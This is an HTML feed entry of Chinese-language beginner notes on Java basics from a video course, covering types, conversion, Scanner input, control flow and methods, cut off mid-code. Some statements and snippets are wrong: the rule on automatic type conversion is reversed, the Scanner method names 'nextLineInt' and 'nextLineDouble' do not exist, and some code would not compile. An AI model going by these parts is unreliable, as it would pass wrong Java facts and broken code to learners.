        <content type="html"><![CDATA[<h1 id="java基础"><a href="#java基础" class="headerlink" title="java基础"></a>java基础</h1><p><strong>笔记内容学自链接视频：<code>https://www.bilibili.com/video/BV12J41137hu</code></strong></p><h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><ul><li><p>java文件后缀 <code>.java</code></p></li><li><p>java文件名要与类名一致</p></li><li><p>全语言语法雷同</p></li><li><p>java大小写敏感，写代码注意大小写</p></li><li><p>java同时存在编译型和解释型</p><blockquote><p>简单说，编译型是先编译在执行，解释型是执行的同时进行编译（或者先执行后编译）</p></blockquote></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>写好java文件，就该编译成字节码了，目的是把Java文件编译成JVM能够执行的Class文件。</p><p>本地编译也可，编译后可运行编译后文件，各大编程工具都会自动编译，记事本除外</p><p><img src="image-20210702210424155.png" alt="image-20210702210424155"></p><p><img src="image-20210702210447907.png" alt="image-20210702210447907"></p><p>编译与否，本地大抵就是这样</p><h2 id="java基础语法"><a href="#java基础语法" class="headerlink" title="java基础语法"></a>java基础语法</h2><ul><li><p>注释：</p><blockquote><p>单行：//</p><p>多行：/**/</p><p>文档：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/****/</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>/**</code>开头<code>*/</code>结尾，中间每行以<code>*</code>开头</p></blockquote></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** *                             _ooOoo_ *                            o8888888o *                            88" . "88 *                            (| -_- |) *                            O\  =  /O *                         ____/`---'\____ *                       .'  \\|     |//  `. *                      /  \\|||  :  |||//  \ *                     /  _||||| -:- |||||-  \ *                     |   | \\\  -  /// |   | *                     | \_|  ''\---/''  |   | *                     \  .-\__  `-`  ___/-. / *                   ___`. .'  /--.--\  `. . __ *                ."" '&lt;  `.___\_&lt;|>_/___.'  >'"". *               | | :  `- \`.;`\ _ /`;.`/ - ` : | | *               \  \ `-.   \_ __\ /__ _/   .-` /  / *          ======`-.____`-.___\_____/___.-`____.-'====== *                             `=---=' *          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ *                     佛祖保佑        永无BUG *            佛曰: *                   写字楼里写字间，写字间里程序员； *                   程序人员写程序，又拿程序换酒钱。 *                   酒醒只在网上坐，酒醉还来网下眠； *                   酒醉酒醒日复日，网上网下年复年。 *                   但愿老死电脑间，不愿鞠躬老板前； *                   奔驰宝马贵者趣，公交自行程序员。 *                   别人笑我忒疯癫，我笑自己命太贱； *                   不见满街漂亮妹，哪个归得程序员？*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><ul><li>关键字：</li></ul><p><img src="image-20210702215742511.png" alt="image-20210702215742511"></p><p>java组成部分如名字，类名，变量名，方法名都称为标识符</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>java数据类型分基本类型和引用类型</p><h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><ul><li><p>整数：</p><blockquote><ul><li>字节： byte   1B</li><li>短整型：short    2B</li><li>整形： int  4B</li><li>长整形： long 8B</li></ul><p>为了便于区分，长整型要在数字后加字母L</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Heool</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">byte</span> by <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>        <span class="token keyword">short</span> sh <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> in <span class="token operator">=</span> <span class="token number">40</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> lo <span class="token operator">=</span> 50L<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li><li><p>小数：浮点数</p><blockquote><ul><li>单精度浮点型：float  4B</li><li>双精度浮点型： double  8B</li></ul><p>两者的区别可以简单理解为float精度小，占内存少，double精度大，占内存多</p><p>float型要在数字后加字母F</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span><span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">float</span> fl <span class="token operator">=</span> <span class="token number">1.23F</span><span class="token punctuation">;</span>        <span class="token keyword">double</span> dou <span class="token operator">=</span> <span class="token number">3.1415926</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li><li><p>字符</p><blockquote><p>字符型: char 2B</p><p>字符型只能是一个字符，不能多定,使用时用单引号包裹，不能用双引号</p><p>字符的本质是数字，例如:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span><span class="token punctuation">{</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>     <span class="token keyword">char</span> ch1 <span class="token operator">=</span> <span class="token string">'\u0061'</span><span class="token punctuation">;</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>ch1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//结果为 65  a 转义后为对应ascii值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li><li><p>bool（布尔）</p><blockquote><p>布尔型： boolean  1位</p><p>布尔型的值只能是true或者false</p></blockquote><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> boo <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进制</p><p>  <img src="image-20210703101755126.png" alt="image-20210703101755126"></p><p>  进制表示在数字前加相应标识符即可</p></li></ul><h4 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h4><p><img src="image-20210703110823669.png" alt="image-20210703110823669"></p><p>从高容量类型转低容量会自动转换</p><p>从低容量到高容量要强制转换</p><p>计算后数据非父数据类型，要将一个数先强制转换为目标数据，防止出错</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>c <span class="token operator">=</span> a <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>多个整形计算，如果有long类型，自动转换后类型一定为long，无long一定为int</p><p>多个浮点型计算，如果有double类型，自动转换后一定为double</p><p>转换会存在内存溢出和精度问题</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">num</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">float</span> a <span class="token operator">=</span> <span class="token number">13.9F</span><span class="token punctuation">;</span>                    <span class="token keyword">double</span> b <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>                    b <span class="token operator">=</span> a<span class="token punctuation">;</span>                    c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210703110408937.png" alt="image-20210703110408937"></p><h4 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h4><p>new的一个类的变量即为引用类型</p><pre class="line-numbers language-java"><code class="language-java">Demo03 demo03 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo03</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Demo03即为引用类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="输出——print与println"><a href="#输出——print与println" class="headerlink" title="输出——print与println"></a>输出——print与println</h3><p>println输出完毕会换行，print输出完不会换行</p><p><img src="image-20210703100834360.png" alt="image-20210703100834360"></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><img src="image-20210703111741309.png" alt="image-20210703111741309"></p><p>变量三要素： 类型，变量名，作用域</p><p>作用域即变量作用范围</p><p>类变量和其他变量的区别是在类型前定义了静态 static</p><p>若没有对实例变量进行定义，基本类型初始为0，其他类型初始为null</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span><span class="token punctuation">{</span>        <span class="token keyword">static</span> String wu <span class="token operator">=</span> <span class="token string">"来打游戏吗？"</span><span class="token punctuation">;</span>        String gree <span class="token operator">=</span> <span class="token string">"拉个女孩子，一起打游戏？"</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>                    String gile <span class="token operator">=</span> <span class="token string">"早啊"</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>gile<span class="token punctuation">)</span><span class="token punctuation">;</span>                    Hello hello <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span>gree<span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>wu<span class="token punctuation">)</span><span class="token punctuation">;</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"十点开黑，不见不散"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p><img src="image-20210703114056284.png" alt="image-20210703114056284"></p><p>final为修饰符，不存在先后顺序</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p><img src="image-20210703114443442.png" alt="image-20210703114443442"></p><p>之前其他语言学了，不做详细解释</p><h4 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h4><p>说一下左右移</p><p>数据在计算机中以二进制存在，如</p><p>2 ： 0000 0010</p><p>左移<code>&lt;&lt;</code>就是将2的二进制整体向左移动，右移向右</p><p>2&lt;&lt;1 : 0000 0100</p><p><img src="image-20210703145645025.png" alt="image-20210703145645025"></p><p>简单理解，左移乘二，右移除二</p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p><img src="image-20210703145959688.png" alt="image-20210703145959688"></p><p>Sring 后出现+，默认后面的所有类型为字符串</p><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><pre class="line-numbers language-java"><code class="language-java">x <span class="token operator">?</span> y <span class="token operator">:</span> z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果x为真，使用y否则使用z</p><h2 id="javadoc"><a href="#javadoc" class="headerlink" title="javadoc"></a>javadoc</h2><h3 id="doc指令"><a href="#doc指令" class="headerlink" title="doc指令"></a>doc指令</h3><ul><li><code>@author</code> : 作者</li><li><code>@version</code>：版本</li><li><code>@since</code>: 开发版本</li></ul><p><img src="image-20210704144709477.png" alt="image-20210704144709477"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @author MUjie * @version 1.0 * @since 13.0.2 * */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Doc</span> <span class="token punctuation">{</span>        String name<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/**         * @author Mujie         * @param name         * @return         */</span>        <span class="token keyword">public</span> String <span class="token function">test</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>                <span class="token keyword">return</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="java包机制"><a href="#java包机制" class="headerlink" title="java包机制"></a>java包机制</h2><p>java的包就相当于命名空间，具体不解释</p><p>包中文件使用package 标识</p><p><img src="image-20210703115049236.png" alt="image-20210703115049236"></p><p>这样定义同名类就不会冲突</p><p>java的包机制还是比较特殊的，规定包名必须为倒置的域名，当然也可以不这么做</p><p>以src文件为项目根目录，就好像php是以www为根目录</p><p>目录格式：</p><p><img src="SouthEast.png" alt="目录格式"></p><h1 id="java语法"><a href="#java语法" class="headerlink" title="java语法"></a>java语法</h1><h2 id="Scanner-类-接收用户输入"><a href="#Scanner-类-接收用户输入" class="headerlink" title="Scanner 类-接收用户输入"></a>Scanner 类-接收用户输入</h2><p>java在java.util中定义了获取输入的类</p><p>使用时需将Scanner类实例化</p><pre class="line-numbers language-java"><code class="language-java">Scanner scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//out表示输出，in表示输入</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用 hasNext 与 hasNextLine 判断是否还有输入的数据</p><p>使用next或nextLine接收用户输入</p><p><img src="image-20210704155922324.png" alt="image-20210704155922324"></p><p>hasNext和hasNextLine同理</p><h3 id="next和nextLine"><a href="#next和nextLine" class="headerlink" title="next和nextLine"></a>next和nextLine</h3><p>举个简单的例子</p><p>如果使用next得到输入，遇到空格就会停止，空格后面的数据不会接收</p><p>这时没有接收的数据仍在缓冲区中，若使用循环，会得到没有接收的数据</p><p><img src="image-20210704160430832.png" alt="image-20210704160430832"></p><p>可以看到，循环语句没有让我们再次输入</p><p>nextLine 遇回车结束，当写在循环中时，会再次让我们输出</p><p><img src="image-20210704160707412.png" alt="image-20210704160707412"></p><h3 id="hasNext和hasNextLine"><a href="#hasNext和hasNextLine" class="headerlink" title="hasNext和hasNextLine"></a>hasNext和hasNextLine</h3><ul><li><code>hasNext()</code>方法会判断接下来是否有非空字符.如果有则返回<code>true</code>,否则返回<code>false</code></li><li><code>hasNextLine()</code> 方法会根据行匹配模式去判断接下来是否有一行(包括空行),如果有则返回<code>true</code>,否则返回<code>false</code></li></ul><pre class="line-numbers language-java"><code class="language-java">Scanner scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String str <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上述的代码</p><p>当写入</p><p>Hello【回车】</p><p>a【空格】h</p><p>Hello在hasNext和nextLine均判断通过，循环语句再次请求输入</p><p>【空格】h在hasNext时判断为结束，所以nextLine只接收到了空格，h仍在缓存区</p><p><img src="image-20210704162206887.png" alt="image-20210704162206887"></p><p>后面我再次测试，这个问题没有出现，输出了正常的【空格】h，所以具体原因没来的即探究</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>获取输入时，需将next-hasnext 或nextLine-hasNextLine成对出现，否则有时会产生错误</p><h3 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h3><p>除字符型String默认nextLine和hasNextLine外，指定其他输入的类型需要特别指明</p><p>如int型为nextLineInt,double为nextLineDouble</p><p>不指明会报错</p><p><img src="image-20210704165203018.png" alt="image-20210704165203018"></p><p>同时，除String可用Line得到外，其他类型数据均只能使用next+类型而不能使用nextLine</p><p>如果使用next获取数据后在缓存区留有数据的情况下关闭Scanner，程序会报错</p><p><img src="image-20210704165655490.png" alt="image-20210704165655490"></p><h2 id="结构控制"><a href="#结构控制" class="headerlink" title="结构控制"></a>结构控制</h2><p>顺序结构略</p><h3 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h3><p>语法：if(表达式){语句}</p><p>注意：比较String型不要使用<code>==</code>而是改用equals(译：与..相等)</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//从键盘接收数据</span>    Scanner scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>    String str <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"说点什么吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里推荐一个idea的快捷键ALT+ENTER</p><p><img src="image-20210704173636532.png" alt="image-20210704173636532"></p><p>可以快速修正代码，让代码简洁起来</p><p>if语句中定义的值只能在该if中使用，如果要做其他作业域使用，需要定义至相应作用域</p><p><img src="image-20210704174930381.png" alt="image-20210704174930381"></p><h4 id="多级选择switch"><a href="#多级选择switch" class="headerlink" title="多级选择switch"></a>多级选择switch</h4><p>语句：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">switch</span><span class="token punctuation">(</span>字符<span class="token punctuation">)</span>    <span class="token keyword">case</span> 字符<span class="token operator">:</span>        语句<span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> 字符<span class="token operator">:</span>        语句<span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        语句<span class="token number">3</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//break可选</span><span class="token comment" spellcheck="true">//若case没有匹配到，执行def</span><span class="token comment" spellcheck="true">//不使用break，会发生case穿透现象，即从匹配成功的开头输出下面所有选项</span><span class="token comment" spellcheck="true">//JDK7后，表达式支持比较字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><ul><li>while 条件为真执行循环，先判断后执行</li><li>do-while 条件为真执行循环，先执行后判断（所以至少执行一次循环语句）</li><li>for(初始值；条件；迭代) 条件成立执行循环</li></ul><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><p>语法：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//定义数组</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//遍历输出</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token operator">:</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//将a中的元素挨个复制给x，输出x</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h4><h5 id="break-continue"><a href="#break-continue" class="headerlink" title="break,continue"></a>break,continue</h5><p>过于常用，不做解释</p><h5 id="goto标签"><a href="#goto标签" class="headerlink" title="goto标签"></a>goto标签</h5><p>java中没有被正式使用</p><p>字符串+<code>:</code>即为一个标签，用于跳回指定位置</p><pre class="line-numbers language-java"><code class="language-java">outer<span class="token operator">:</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">40</span><span class="token punctuation">)</span> <span class="token keyword">continue</span> outer<span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//一般情况，可以写，没必要，和continue效果相似</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210704204759684.png" alt="image-20210704204759684"></p><h1 id="java方法"><a href="#java方法" class="headerlink" title="java方法"></a>java方法</h1><h2 id="java语句解析"><a href="#java语句解析" class="headerlink" title="java语句解析"></a>java语句解析</h2><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Kong</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//定义一个属性是public的类，名为Kong    </span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//定义一个属性是public的静态方法，名为main，执行结束后返回值为void(无返回值/不返回)      </span>    <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">;</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//定义一个属性是public的方法，名为sum，传入两个整数a,b,执行结束后返回一个int类型数据        </span>        <span class="token keyword">return</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回10    </span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token 